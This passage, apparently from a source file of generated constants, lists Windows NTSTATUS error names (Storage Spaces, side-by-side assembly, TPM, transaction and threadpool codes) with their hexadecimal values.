STATUS_SOURCE_ELEMENT_EMPTY                                               NTStatus      = 0xC0000283
STATUS_SPACES_ALLOCATION_SIZE_INVALID                                     NTStatus      = 0xC0E7000E
STATUS_SPACES_COMPLETE                                                    NTStatus      = 0x00E70002
STATUS_SPACES_CORRUPT_METADATA                                            NTStatus      = 0xC0E70016
STATUS_SPACES_DRIVE_LOST_DATA                                             NTStatus      = 0xC0E7001D
STATUS_SPACES_DRIVE_NOT_READY                                             NTStatus      = 0xC0E7001B
STATUS_SPACES_DRIVE_OPERATIONAL_STATE_INVALID                             NTStatus      = 0xC0E70012
STATUS_SPACES_DRIVE_REDUNDANCY_INVALID                                    NTStatus      = 0xC0E70006
STATUS_SPACES_DRIVE_SECTOR_SIZE_INVALID                                   NTStatus      = 0xC0E70004
STATUS_SPACES_DRIVE_SPLIT                                                 NTStatus      = 0xC0E7001C
STATUS_SPACES_DRT_FULL                                                    NTStatus      = 0xC0E70017
STATUS_SPACES_ENCLOSURE_AWARE_INVALID                                     NTStatus      = 0xC0E7000F
STATUS_SPACES_ENTRY_INCOMPLETE                                            NTStatus      = 0xC0E7001E
STATUS_SPACES_ENTRY_INVALID                                               NTStatus      = 0xC0E7001F
STATUS_SPACES_EXTENDED_ERROR                                              NTStatus      = 0xC0E7000C
STATUS_SPACES_FAULT_DOMAIN_TYPE_INVALID                                   NTStatus      = 0xC0E70001
STATUS_SPACES_INCONSISTENCY                                               NTStatus      = 0xC0E70018
STATUS_SPACES_INTERLEAVE_LENGTH_INVALID                                   NTStatus      = 0xC0E70009
STATUS_SPACES_LOG_NOT_READY                                               NTStatus      = 0xC0E70019
STATUS_SPACES_MAP_REQUIRED                                                NTStatus      = 0xC0E70014
STATUS_SPACES_MARK_DIRTY                                                  NTStatus      = 0xC0E70020
STATUS_SPACES_NOT_ENOUGH_DRIVES                                           NTStatus      = 0xC0E7000B
STATUS_SPACES_NO_REDUNDANCY                                               NTStatus      = 0xC0E7001A
STATUS_SPACES_NUMBER_OF_COLUMNS_INVALID                                   NTStatus      = 0xC0E7000A
STATUS_SPACES_NUMBER_OF_DATA_COPIES_INVALID                               NTStatus      = 0xC0E70007
STATUS_SPACES_NUMBER_OF_GROUPS_INVALID                                    NTStatus      = 0xC0E70011
STATUS_SPACES_PAUSE                                                       NTStatus      = 0x00E70001
STATUS_SPACES_PROVISIONING_TYPE_INVALID                                   NTStatus      = 0xC0E7000D
STATUS_SPACES_REDIRECT                                                    NTStatus      = 0x00E70003
STATUS_SPACES_REPAIRED                                                    NTStatus      = 0x00E70000
STATUS_SPACES_RESILIENCY_TYPE_INVALID                                     NTStatus      = 0xC0E70003
STATUS_SPACES_UNSUPPORTED_VERSION                                         NTStatus      = 0xC0E70015
STATUS_SPACES_UPDATE_COLUMN_STATE                                         NTStatus      = 0xC0E70013
STATUS_SPACES_WRITE_CACHE_SIZE_INVALID                                    NTStatus      = 0xC0E70010
STATUS_SPARSE_NOT_ALLOWED_IN_TRANSACTION                                  NTStatus      = 0xC0190049
STATUS_SPECIAL_ACCOUNT                                                    NTStatus      = 0xC0000124
STATUS_SPECIAL_GROUP                                                      NTStatus      = 0xC0000125
STATUS_SPECIAL_USER                                                       NTStatus      = 0xC0000126
STATUS_STACK_BUFFER_OVERRUN                                               NTStatus      = 0xC0000409
STATUS_STACK_OVERFLOW                                                     NTStatus      = 0xC00000FD
STATUS_STACK_OVERFLOW_READ                                                NTStatus      = 0xC0000228
STATUS_STOPPED_ON_SYMLINK                                                 NTStatus      = 0x8000002D
STATUS_STORAGE_LOST_DATA_PERSISTENCE                                      NTStatus      = 0xC000049E
STATUS_STORAGE_RESERVE_ALREADY_EXISTS                                     NTStatus      = 0xC00004AF
STATUS_STORAGE_RESERVE_DOES_NOT_EXIST                                     NTStatus      = 0xC00004AE
STATUS_STORAGE_RESERVE_ID_INVALID                                         NTStatus      = 0xC00004AD
STATUS_STORAGE_RESERVE_NOT_EMPTY                                          NTStatus      = 0xC00004B0
STATUS_STORAGE_TOPOLOGY_ID_MISMATCH                                       NTStatus      = 0xC0000486
STATUS_STOWED_EXCEPTION                                                   NTStatus      = 0xC000027B
STATUS_STREAM_MINIVERSION_NOT_FOUND                                       NTStatus      = 0xC0190022
STATUS_STREAM_MINIVERSION_NOT_VALID                                       NTStatus      = 0xC0190023
STATUS_STRICT_CFG_VIOLATION                                               NTStatus      = 0xC0000606
STATUS_STRONG_CRYPTO_NOT_SUPPORTED                                        NTStatus      = 0xC00002F6
STATUS_SUCCESS                                                            NTStatus      = 0x00000000
STATUS_SUSPEND_COUNT_EXCEEDED                                             NTStatus      = 0xC000004A
STATUS_SVHDX_ERROR_NOT_AVAILABLE                                          NTStatus      = 0xC05CFF00
STATUS_SVHDX_ERROR_STORED                                                 NTStatus      = 0xC05C0000
STATUS_SVHDX_NO_INITIATOR                                                 NTStatus      = 0xC05CFF0B
STATUS_SVHDX_RESERVATION_CONFLICT                                         NTStatus      = 0xC05CFF07
STATUS_SVHDX_UNIT_ATTENTION_AVAILABLE                                     NTStatus      = 0xC05CFF01
STATUS_SVHDX_UNIT_ATTENTION_CAPACITY_DATA_CHANGED                         NTStatus      = 0xC05CFF02
STATUS_SVHDX_UNIT_ATTENTION_OPERATING_DEFINITION_CHANGED                  NTStatus      = 0xC05CFF06
STATUS_SVHDX_UNIT_ATTENTION_REGISTRATIONS_PREEMPTED                       NTStatus      = 0xC05CFF05
STATUS_SVHDX_UNIT_ATTENTION_RESERVATIONS_PREEMPTED                        NTStatus      = 0xC05CFF03
STATUS_SVHDX_UNIT_ATTENTION_RESERVATIONS_RELEASED                         NTStatus      = 0xC05CFF04
STATUS_SVHDX_VERSION_MISMATCH                                             NTStatus      = 0xC05CFF09
STATUS_SVHDX_WRONG_FILE_TYPE                                              NTStatus      = 0xC05CFF08
STATUS_SXS_ACTIVATION_CONTEXT_DISABLED                                    NTStatus      = 0xC0150007
STATUS_SXS_ASSEMBLY_IS_NOT_A_DEPLOYMENT                                   NTStatus      = 0xC015001E
STATUS_SXS_ASSEMBLY_MISSING                                               NTStatus      = 0xC015000C
STATUS_SXS_ASSEMBLY_NOT_FOUND                                             NTStatus      = 0xC0150004
STATUS_SXS_CANT_GEN_ACTCTX                                                NTStatus      = 0xC0150002
STATUS_SXS_COMPONENT_STORE_CORRUPT                                        NTStatus      = 0xC015001A
STATUS_SXS_CORRUPTION                                                     NTStatus      = 0xC0150015
STATUS_SXS_CORRUPT_ACTIVATION_STACK                                       NTStatus      = 0xC0150014
STATUS_SXS_EARLY_DEACTIVATION                                             NTStatus      = 0xC015000F
STATUS_SXS_FILE_HASH_MISMATCH                                             NTStatus      = 0xC015001B
STATUS_SXS_FILE_HASH_MISSING                                              NTStatus      = 0xC0150027
STATUS_SXS_FILE_NOT_PART_OF_ASSEMBLY                                      NTStatus      = 0xC015001F
STATUS_SXS_IDENTITIES_DIFFERENT                                           NTStatus      = 0xC015001D
STATUS_SXS_IDENTITY_DUPLICATE_ATTRIBUTE                                   NTStatus      = 0xC0150018
STATUS_SXS_IDENTITY_PARSE_ERROR                                           NTStatus      = 0xC0150019
STATUS_SXS_INVALID_ACTCTXDATA_FORMAT                                      NTStatus      = 0xC0150003
STATUS_SXS_INVALID_DEACTIVATION                                           NTStatus      = 0xC0150010
STATUS_SXS_INVALID_IDENTITY_ATTRIBUTE_NAME                                NTStatus      = 0xC0150017
STATUS_SXS_INVALID_IDENTITY_ATTRIBUTE_VALUE                               NTStatus      = 0xC0150016
STATUS_SXS_KEY_NOT_FOUND                                                  NTStatus      = 0xC0150008
STATUS_SXS_MANIFEST_FORMAT_ERROR                                          NTStatus      = 0xC0150005
STATUS_SXS_MANIFEST_IDENTITY_SAME_BUT_CONTENTS_DIFFERENT                  NTStatus      = 0xC015001C
STATUS_SXS_MANIFEST_PARSE_ERROR                                           NTStatus      = 0xC0150006
STATUS_SXS_MANIFEST_TOO_BIG                                               NTStatus      = 0xC0150022
STATUS_SXS_MULTIPLE_DEACTIVATION                                          NTStatus      = 0xC0150011
STATUS_SXS_PROCESS_DEFAULT_ALREADY_SET                                    NTStatus      = 0xC015000E
STATUS_SXS_PROCESS_TERMINATION_REQUESTED                                  NTStatus      = 0xC0150013
STATUS_SXS_RELEASE_ACTIVATION_CONTEXT                                     NTStatus      = 0x4015000D
STATUS_SXS_SECTION_NOT_FOUND                                              NTStatus      = 0xC0150001
STATUS_SXS_SETTING_NOT_REGISTERED                                         NTStatus      = 0xC0150023
STATUS_SXS_SYSTEM_DEFAULT_ACTIVATION_CONTEXT_EMPTY                        NTStatus      = 0xC0150012
STATUS_SXS_THREAD_QUERIES_DISABLED                                        NTStatus      = 0xC015000B
STATUS_SXS_TRANSACTION_CLOSURE_INCOMPLETE                                 NTStatus      = 0xC0150024
STATUS_SXS_VERSION_CONFLICT                                               NTStatus      = 0xC0150009
STATUS_SXS_WRONG_SECTION_TYPE                                             NTStatus      = 0xC015000A
STATUS_SYMLINK_CLASS_DISABLED                                             NTStatus      = 0xC0000715
STATUS_SYNCHRONIZATION_REQUIRED                                           NTStatus      = 0xC0000134
STATUS_SYSTEM_DEVICE_NOT_FOUND                                            NTStatus      = 0xC0000452
STATUS_SYSTEM_HIVE_TOO_LARGE                                              NTStatus      = 0xC000036E
STATUS_SYSTEM_IMAGE_BAD_SIGNATURE                                         NTStatus      = 0xC00002D1
STATUS_SYSTEM_INTEGRITY_INVALID_POLICY                                    NTStatus      = 0xC0E90003
STATUS_SYSTEM_INTEGRITY_POLICY_NOT_SIGNED                                 NTStatus      = 0xC0E90004
STATUS_SYSTEM_INTEGRITY_POLICY_VIOLATION                                  NTStatus      = 0xC0E90002
STATUS_SYSTEM_INTEGRITY_ROLLBACK_DETECTED                                 NTStatus      = 0xC0E90001
STATUS_SYSTEM_INTEGRITY_SUPPLEMENTAL_POLICY_NOT_AUTHORIZED                NTStatus      = 0xC0E90006
STATUS_SYSTEM_INTEGRITY_TOO_MANY_POLICIES                                 NTStatus      = 0xC0E90005
STATUS_SYSTEM_NEEDS_REMEDIATION                                           NTStatus      = 0xC000047E
STATUS_SYSTEM_POWERSTATE_COMPLEX_TRANSITION                               NTStatus      = 0x40000031
STATUS_SYSTEM_POWERSTATE_TRANSITION                                       NTStatus      = 0x4000002F
STATUS_SYSTEM_PROCESS_TERMINATED                                          NTStatus      = 0xC000021A
STATUS_SYSTEM_SHUTDOWN                                                    NTStatus      = 0xC00002EB
STATUS_THREADPOOL_FREE_LIBRARY_ON_COMPLETION_FAILED                       NTStatus      = 0xC000070E
STATUS_THREADPOOL_HANDLE_EXCEPTION                                        NTStatus      = 0xC000070A
STATUS_THREADPOOL_RELEASED_DURING_OPERATION                               NTStatus      = 0xC000070F
STATUS_THREADPOOL_RELEASE_MUTEX_ON_COMPLETION_FAILED                      NTStatus      = 0xC000070D
STATUS_THREADPOOL_RELEASE_SEMAPHORE_ON_COMPLETION_FAILED                  NTStatus      = 0xC000070C
STATUS_THREADPOOL_SET_EVENT_ON_COMPLETION_FAILED                          NTStatus      = 0xC000070B
STATUS_THREAD_ALREADY_IN_SESSION                                          NTStatus      = 0xC0000456
STATUS_THREAD_ALREADY_IN_TASK                                             NTStatus      = 0xC0000502
STATUS_THREAD_IS_TERMINATING                                              NTStatus      = 0xC000004B
STATUS_THREAD_NOT_IN_PROCESS                                              NTStatus      = 0xC000012A
STATUS_THREAD_NOT_IN_SESSION                                              NTStatus      = 0xC0000457
STATUS_THREAD_NOT_RUNNING                                                 NTStatus      = 0xC0000516
STATUS_THREAD_WAS_SUSPENDED                                               NTStatus      = 0x40000001
STATUS_TIMEOUT                                                            NTStatus      = 0x00000102
STATUS_TIMER_NOT_CANCELED                                                 NTStatus      = 0xC000000C
STATUS_TIMER_RESOLUTION_NOT_SET                                           NTStatus      = 0xC0000245
STATUS_TIMER_RESUME_IGNORED                                               NTStatus      = 0x40000025
STATUS_TIME_DIFFERENCE_AT_DC                                              NTStatus      = 0xC0000133
STATUS_TM_IDENTITY_MISMATCH                                               NTStatus      = 0xC019004A
STATUS_TM_INITIALIZATION_FAILED                                           NTStatus      = 0xC0190004
STATUS_TM_VOLATILE                                                        NTStatus      = 0xC019003B
STATUS_TOKEN_ALREADY_IN_USE                                               NTStatus      = 0xC000012B
STATUS_TOO_LATE                                                           NTStatus      = 0xC0000189
STATUS_TOO_MANY_ADDRESSES                                                 NTStatus      = 0xC0000209
STATUS_TOO_MANY_COMMANDS                                                  NTStatus      = 0xC00000C1
STATUS_TOO_MANY_CONTEXT_IDS                                               NTStatus      = 0xC000015A
STATUS_TOO_MANY_GUIDS_REQUESTED                                           NTStatus      = 0xC0000082
STATUS_TOO_MANY_LINKS                                                     NTStatus      = 0xC0000265
STATUS_TOO_MANY_LUIDS_REQUESTED                                           NTStatus      = 0xC0000074
STATUS_TOO_MANY_NAMES                                                     NTStatus      = 0xC00000CD
STATUS_TOO_MANY_NODES                                                     NTStatus      = 0xC000020E
STATUS_TOO_MANY_OPENED_FILES                                              NTStatus      = 0xC000011F
STATUS_TOO_MANY_PAGING_FILES                                              NTStatus      = 0xC0000097
STATUS_TOO_MANY_PRINCIPALS                                                NTStatus      = 0xC00002F7
STATUS_TOO_MANY_SECRETS                                                   NTStatus      = 0xC0000156
STATUS_TOO_MANY_SEGMENT_DESCRIPTORS                                       NTStatus      = 0xC0000473
STATUS_TOO_MANY_SESSIONS                                                  NTStatus      = 0xC00000CE
STATUS_TOO_MANY_SIDS                                                      NTStatus      = 0xC000017E
STATUS_TOO_MANY_THREADS                                                   NTStatus      = 0xC0000129
STATUS_TPM_20_E_ASYMMETRIC                                                NTStatus      = 0xC0290081
STATUS_TPM_20_E_ATTRIBUTES                                                NTStatus      = 0xC0290082
STATUS_TPM_20_E_AUTHSIZE                                                  NTStatus      = 0xC0290144
STATUS_TPM_20_E_AUTH_CONTEXT                                              NTStatus      = 0xC0290145
STATUS_TPM_20_E_AUTH_FAIL                                                 NTStatus      = 0xC029008E
STATUS_TPM_20_E_AUTH_MISSING                                              NTStatus      = 0xC0290125
STATUS_TPM_20_E_AUTH_TYPE                                                 NTStatus      = 0xC0290124
STATUS_TPM_20_E_AUTH_UNAVAILABLE                                          NTStatus      = 0xC029012F
STATUS_TPM_20_E_BAD_AUTH                                                  NTStatus      = 0xC02900A2
STATUS_TPM_20_E_BAD_CONTEXT                                               NTStatus      = 0xC0290150
STATUS_TPM_20_E_BINDING                                                   NTStatus      = 0xC02900A5
STATUS_TPM_20_E_COMMAND_CODE                                              NTStatus      = 0xC0290143
STATUS_TPM_20_E_COMMAND_SIZE                                              NTStatus      = 0xC0290142
STATUS_TPM_20_E_CPHASH                                                    NTStatus      = 0xC0290151
STATUS_TPM_20_E_CURVE                                                     NTStatus      = 0xC02900A6
STATUS_TPM_20_E_DISABLED                                                  NTStatus      = 0xC0290120
STATUS_TPM_20_E_ECC_CURVE                                                 NTStatus      = 0xC0290123
STATUS_TPM_20_E_ECC_POINT                                                 NTStatus      = 0xC02900A7
STATUS_TPM_20_E_EXCLUSIVE                                                 NTStatus      = 0xC0290121
STATUS_TPM_20_E_EXPIRED                                                   NTStatus      = 0xC02900A3
STATUS_TPM_20_E_FAILURE                                                   NTStatus      = 0xC0290101
STATUS_TPM_20_E_HANDLE                                                    NTStatus      = 0xC029008B
STATUS_TPM_20_E_HASH                                                      NTStatus      = 0xC0290083
STATUS_TPM_20_E_HIERARCHY                                                 NTStatus      = 0xC0290085
STATUS_TPM_20_E_HMAC                                                      NTStatus      = 0xC0290119
STATUS_TPM_20_E_INITIALIZE                                                NTStatus      = 0xC0290100
STATUS_TPM_20_E_INSUFFICIENT                                              NTStatus      = 0xC029009A
STATUS_TPM_20_E_INTEGRITY                                                 NTStatus      = 0xC029009F
STATUS_TPM_20_E_KDF                                                       NTStatus      = 0xC029008C
STATUS_TPM_20_E_KEY                                                       NTStatus      = 0xC029009C
STATUS_TPM_20_E_KEY_SIZE                                                  NTStatus      = 0xC0290087
STATUS_TPM_20_E_MGF                                                       NTStatus      = 0xC0290088
STATUS_TPM_20_E_MODE                                                      NTStatus      = 0xC0290089
STATUS_TPM_20_E_NEEDS_TEST                                                NTStatus      = 0xC0290153
STATUS_TPM_20_E_NONCE                                                     NTStatus      = 0xC029008F
STATUS_TPM_20_E_NO_RESULT                                                 NTStatus      = 0xC0290154
STATUS_TPM_20_E_NV_AUTHORIZATION                                          NTStatus      = 0xC0290149
STATUS_TPM_20_E_NV_DEFINED                                                NTStatus      = 0xC029014C
STATUS_TPM_20_E_NV_LOCKED                                                 NTStatus      = 0xC0290148
STATUS_TPM_20_E_NV_RANGE                                                  NTStatus      = 0xC0290146
STATUS_TPM_20_E_NV_SIZE                                                   NTStatus      = 0xC0290147
STATUS_TPM_20_E_NV_SPACE                                                  NTStatus      = 0xC029014B
STATUS_TPM_20_E_NV_UNINITIALIZED                                          NTStatus      = 0xC029014A
STATUS_TPM_20_E_PARENT                                                    NTStatus      = 0xC0290152
STATUS_TPM_20_E_PCR                                                       NTStatus      = 0xC0290127
STATUS_TPM_20_E_PCR_CHANGED                                               NTStatus      = 0xC0290128
STATUS_TPM_20_E_POLICY                                                    NTStatus      = 0xC0290126
STATUS_TPM_20_E_POLICY_CC                                                 NTStatus      = 0xC02900A4
STATUS_TPM_20_E_POLICY_FAIL                                               NTStatus      = 0xC029009D
STATUS_TPM_20_E_PP                                                        NTStatus      = 0xC0290090
STATUS_TPM_20_E_PRIVATE                                                   NTStatus      = 0xC029010B
STATUS_TPM_20_E_RANGE                                                     NTStatus      = 0xC029008D
STATUS_TPM_20_E_REBOOT                                                    NTStatus      = 0xC0290130
STATUS_TPM_20_E_RESERVED_BITS                                             NTStatus      = 0xC02900A1
STATUS_TPM_20_E_SCHEME                                                    NTStatus      = 0xC0290092
STATUS_TPM_20_E_SELECTOR                                                  NTStatus      = 0xC0290098
STATUS_TPM_20_E_SENSITIVE                                                 NTStatus      = 0xC0290155
STATUS_TPM_20_E_SEQUENCE                                                  NTStatus      = 0xC0290103
STATUS_TPM_20_E_SIGNATURE                                                 NTStatus      = 0xC029009B
STATUS_TPM_20_E_SIZE                                                      NTStatus      = 0xC0290095
STATUS_TPM_20_E_SYMMETRIC                                                 NTStatus      = 0xC0290096
STATUS_TPM_20_E_TAG                                                       NTStatus      = 0xC0290097
STATUS_TPM_20_E_TICKET                                                    NTStatus      = 0xC02900A0
STATUS_TPM_20_E_TOO_MANY_CONTEXTS                                         NTStatus      = 0xC029012E
STATUS_TPM_20_E_TYPE                                                      NTStatus      = 0xC029008A
STATUS_TPM_20_E_UNBALANCED                                                NTStatus      = 0xC0290131
STATUS_TPM_20_E_UPGRADE                                                   NTStatus      = 0xC029012D
STATUS_TPM_20_E_VALUE                                                     NTStatus      = 0xC0290084
STATUS_TPM_ACCESS_DENIED                                                  NTStatus      = 0xC0291004
STATUS_TPM_AREA_LOCKED                                                    NTStatus      = 0xC029003C
STATUS_TPM_AUDITFAILURE                                                   NTStatus      = 0xC0290004
STATUS_TPM_AUDITFAIL_SUCCESSFUL                                           NTStatus      = 0xC0290031
STATUS_TPM_AUDITFAIL_UNSUCCESSFUL                                         NTStatus      = 0xC0290030
STATUS_TPM_AUTH2FAIL                                                      NTStatus      = 0xC029001D
STATUS_TPM_AUTHFAIL                                                       NTStatus      = 0xC0290001
STATUS_TPM_AUTH_CONFLICT                                                  NTStatus      = 0xC029003B
STATUS_TPM_BADCONTEXT                                                     NTStatus      = 0xC029005A
STATUS_TPM_BADINDEX                                                       NTStatus      = 0xC0290002
STATUS_TPM_BADTAG                                                         NTStatus      = 0xC029001E
STATUS_TPM_BAD_ATTRIBUTES                                                 NTStatus      = 0xC0290042
STATUS_TPM_BAD_COUNTER                                                    NTStatus      = 0xC0290045
STATUS_TPM_BAD_DATASIZE                                                   NTStatus      = 0xC029002B
STATUS_TPM_BAD_DELEGATE                                                   NTStatus      = 0xC0290059
STATUS_TPM_BAD_HANDLE                                                     NTStatus      = 0xC0290058
STATUS_TPM_BAD_KEY_PROPERTY                                               NTStatus      = 0xC0290028
STATUS_TPM_BAD_LOCALITY                                                   NTStatus      = 0xC029003D
STATUS_TPM_BAD_MIGRATION                                                  NTStatus      = 0xC0290029
STATUS_TPM_BAD_MODE                                                       NTStatus      = 0xC029002C
STATUS_TPM_BAD_ORDINAL                                                    NTStatus      = 0xC029000A
STATUS_TPM_BAD_PARAMETER                                                  NTStatus      = 0xC0290003
STATUS_TPM_BAD_PARAM_SIZE                                                 NTStatus      = 0xC0290019
STATUS_TPM_BAD_PRESENCE                                                   NTStatus      = 0xC029002D
STATUS_TPM_BAD_SCHEME                                                     NTStatus      = 0xC029002A
STATUS_TPM_BAD_SIGNATURE                                                  NTStatus      = 0xC0290062
STATUS_TPM_BAD_TYPE                                                       NTStatus      = 0xC0290034
STATUS_TPM_BAD_VERSION                                                    NTStatus      = 0xC029002E
STATUS_TPM_CLEAR_DISABLED                                                 NTStatus      = 0xC0290005
STATUS_TPM_COMMAND_BLOCKED                                                NTStatus      = 0xC0290400
STATUS_TPM_COMMAND_CANCELED                                               NTStatus      = 0xC0291001
STATUS_TPM_CONTEXT_GAP                                                    NTStatus      = 0xC0290047
STATUS_TPM_DAA_INPUT_DATA0                                                NTStatus      = 0xC0290051
STATUS_TPM_DAA_INPUT_DATA1                                                NTStatus      = 0xC0290052
STATUS_TPM_DAA_ISSUER_SETTINGS                                            NTStatus      = 0xC0290053
STATUS_TPM_DAA_ISSUER_VALIDITY                                            NTStatus      = 0xC0290056
STATUS_TPM_DAA_RESOURCES                                                  NTStatus      = 0xC0290050
STATUS_TPM_DAA_STAGE                                                      NTStatus      = 0xC0290055
STATUS_TPM_DAA_TPM_SETTINGS                                               NTStatus      = 0xC0290054
STATUS_TPM_DAA_WRONG_W                                                    NTStatus      = 0xC0290057
STATUS_TPM_DEACTIVATED                                                    NTStatus      = 0xC0290006
STATUS_TPM_DECRYPT_ERROR                                                  NTStatus      = 0xC0290021
STATUS_TPM_DEFEND_LOCK_RUNNING                                            NTStatus      = 0xC0290803
STATUS_TPM_DELEGATE_ADMIN                                                 NTStatus      = 0xC029004D
STATUS_TPM_DELEGATE_FAMILY                                                NTStatus      = 0xC029004C
STATUS_TPM_DELEGATE_LOCK                                                  NTStatus      = 0xC029004B
STATUS_TPM_DISABLED                                                       NTStatus      = 0xC0290007
STATUS_TPM_DISABLED_CMD                                                   NTStatus      = 0xC0290008
STATUS_TPM_DOING_SELFTEST                                                 NTStatus      = 0xC0290802
STATUS_TPM_DUPLICATE_VHANDLE                                              NTStatus      = 0xC0290402
STATUS_TPM_EMBEDDED_COMMAND_BLOCKED                                       NTStatus      = 0xC0290403
STATUS_TPM_EMBEDDED_COMMAND_UNSUPPORTED                                   NTStatus      = 0xC0290404
STATUS_TPM_ENCRYPT_ERROR                                                  NTStatus      = 0xC0290020
STATUS_TPM_ERROR_MASK                                                     NTStatus      = 0xC0290000
STATUS_TPM_FAIL                                                           NTStatus      = 0xC0290009
STATUS_TPM_FAILEDSELFTEST                                                 NTStatus      = 0xC029001C
STATUS_TPM_FAMILYCOUNT                                                    NTStatus      = 0xC0290040
STATUS_TPM_INAPPROPRIATE_ENC                                              NTStatus      = 0xC029000E
STATUS_TPM_INAPPROPRIATE_SIG                                              NTStatus      = 0xC0290027
STATUS_TPM_INSTALL_DISABLED                                               NTStatus      = 0xC029000B
STATUS_TPM_INSUFFICIENT_BUFFER                                            NTStatus      = 0xC0291005
STATUS_TPM_INVALID_AUTHHANDLE                                             NTStatus      = 0xC0290022
STATUS_TPM_INVALID_FAMILY                                                 NTStatus      = 0xC0290037
STATUS_TPM_INVALID_HANDLE                                                 NTStatus      = 0xC0290401
STATUS_TPM_INVALID_KEYHANDLE                                              NTStatus      = 0xC029000C
STATUS_TPM_INVALID_KEYUSAGE                                               NTStatus      = 0xC0290024
STATUS_TPM_INVALID_PCR_INFO                                               NTStatus      = 0xC0290010
STATUS_TPM_INVALID_POSTINIT                                               NTStatus      = 0xC0290026
STATUS_TPM_INVALID_RESOURCE                                               NTStatus      = 0xC0290035
STATUS_TPM_INVALID_STRUCTURE                                              NTStatus      = 0xC0290043
STATUS_TPM_IOERROR                                                        NTStatus      = 0xC029001F
STATUS_TPM_KEYNOTFOUND                                                    NTStatus      = 0xC029000D
STATUS_TPM_KEY_NOTSUPPORTED                                               NTStatus      = 0xC029003A
STATUS_TPM_KEY_OWNER_CONTROL                                              NTStatus      = 0xC0290044
STATUS_TPM_MAXNVWRITES                                                    NTStatus      = 0xC0290048
STATUS_TPM_MA_AUTHORITY                                                   NTStatus      = 0xC029005F
STATUS_TPM_MA_DESTINATION                                                 NTStatus      = 0xC029005D
STATUS_TPM_MA_SOURCE                                                      NTStatus      = 0xC029005E
STATUS_TPM_MA_TICKET_SIGNATURE                                            NTStatus      = 0xC029005C
STATUS_TPM_MIGRATEFAIL                                                    NTStatus      = 0xC029000F
STATUS_TPM_NEEDS_SELFTEST                                                 NTStatus      = 0xC0290801
STATUS_TPM_NOCONTEXTSPACE                                                 NTStatus      = 0xC0290063
STATUS_TPM_NOOPERATOR                                                     NTStatus      = 0xC0290049
STATUS_TPM_NOSPACE                                                        NTStatus      = 0xC0290011
STATUS_TPM_NOSRK                                                          NTStatus      = 0xC0290012
STATUS_TPM_NOTFIPS                                                        NTStatus      = 0xC0290036
STATUS_TPM_NOTLOCAL                                                       NTStatus      = 0xC0290033
STATUS_TPM_NOTRESETABLE                                                   NTStatus      = 0xC0290032
STATUS_TPM_NOTSEALED_BLOB                                                 NTStatus      = 0xC0290013
STATUS_TPM_NOT_FOUND                                                      NTStatus      = 0xC0291003
STATUS_TPM_NOT_FULLWRITE                                                  NTStatus      = 0xC0290046
STATUS_TPM_NO_ENDORSEMENT                                                 NTStatus      = 0xC0290023
STATUS_TPM_NO_NV_PERMISSION                                               NTStatus      = 0xC0290038
STATUS_TPM_NO_WRAP_TRANSPORT                                              NTStatus      = 0xC029002F
STATUS_TPM_OWNER_CONTROL                                                  NTStatus      = 0xC029004F
STATUS_TPM_OWNER_SET                                                      NTStatus      = 0xC0290014
STATUS_TPM_PERMANENTEK                                                    NTStatus      = 0xC0290061
STATUS_TPM_PER_NOWRITE                                                    NTStatus      = 0xC029003F
STATUS_TPM_PPI_FUNCTION_UNSUPPORTED                                       NTStatus      = 0xC0291006
STATUS_TPM_READ_ONLY                                                      NTStatus      = 0xC029003E
STATUS_TPM_REQUIRES_SIGN                                                  NTStatus      = 0xC0290039
STATUS_TPM_RESOURCEMISSING                                                NTStatus      = 0xC029004A
STATUS_TPM_RESOURCES                                                      NTStatus      = 0xC0290015
STATUS_TPM_RETRY                                                          NTStatus      = 0xC0290800
STATUS_TPM_SHA_ERROR                                                      NTStatus      = 0xC029001B
STATUS_TPM_SHA_THREAD                                                     NTStatus      = 0xC029001A
STATUS_TPM_SHORTRANDOM                                                    NTStatus      = 0xC0290016
STATUS_TPM_SIZE                                                           NTStatus      = 0xC0290017
STATUS_TPM_TOOMANYCONTEXTS                                                NTStatus      = 0xC029005B
STATUS_TPM_TOO_MANY_CONTEXTS                                              NTStatus      = 0xC0291002
STATUS_TPM_TRANSPORT_NOTEXCLUSIVE                                         NTStatus      = 0xC029004E
STATUS_TPM_WRITE_LOCKED                                                   NTStatus      = 0xC0290041
STATUS_TPM_WRONGPCRVAL                                                    NTStatus      = 0xC0290018
STATUS_TPM_WRONG_ENTITYTYPE                                               NTStatus      = 0xC0290025
STATUS_TPM_ZERO_EXHAUST_ENABLED                                           NTStatus      = 0xC0294000
STATUS_TRANSACTED_MAPPING_UNSUPPORTED_REMOTE                              NTStatus      = 0xC0190040
STATUS_TRANSACTIONAL_CONFLICT                                             NTStatus      = 0xC0190001
STATUS_TRANSACTIONAL_OPEN_NOT_ALLOWED                                     NTStatus      = 0xC019003F
STATUS_TRANSACTIONMANAGER_IDENTITY_MISMATCH                               NTStatus      = 0xC019005C
STATUS_TRANSACTIONMANAGER_NOT_FOUND                                       NTStatus      = 0xC0190051
STATUS_TRANSACTIONMANAGER_NOT_ONLINE                                      NTStatus      = 0xC0190052
STATUS_TRANSACTIONMANAGER_RECOVERY_NAME_COLLISION                         NTStatus      = 0xC0190053
STATUS_TRANSACTIONS_NOT_FROZEN                                            NTStatus      = 0xC0190045
STATUS_TRANSACTIONS_UNSUPPORTED_REMOTE                                    NTStatus      = 0xC019000A
STATUS_TRANSACTION_ABORTED                                                NTStatus      = 0xC000020F
STATUS_TRANSACTION_ALREADY_ABORTED                                        NTStatus      = 0xC0190015
STATUS_TRANSACTION_ALREADY_COMMITTED                                      NTStatus      = 0xC0190016
STATUS_TRANSACTION_FREEZE_IN_PROGRESS                                     NTStatus      = 0xC0190046
STATUS_TRANSACTION_INTEGRITY_VIOLATED                                     NTStatus      = 0xC019005B
STATUS_TRANSACTION_INVALID_ID                                             NTStatus      = 0xC0000214
STATUS_TRANSACTION_INVALID_MARSHALL_BUFFER                                NTStatus      = 0xC0190017
STATUS_TRANSACTION_INVALID_TYPE                                           NTStatus      = 0xC0000215
STATUS_TRANSACTION_MUST_WRITETHROUGH                                      NTStatus      = 0xC019005E
STATUS_TRANSACTION_NOT_ACTIVE                                             NTStatus      = 0xC0190003
STATUS_TRANSACTION_NOT_ENLISTED                                           NTStatus      = 0xC0190061
STATUS_TRANSACTION_NOT_FOUND                                              NTStatus      = 0xC019004E
STATUS_TRANSACTION_NOT_JOINED                                             NTStatus      = 0xC0190007
STATUS_TRANSACTION_NOT_REQUESTED                                          NTStatus      = 0xC0190014
STATUS_TRANSACTION_NOT_ROOT                                               NTStatus      = 0xC0190054
STATUS_TRANSACTION_NO_MATCH                                               NTStatus      = 0xC0000212
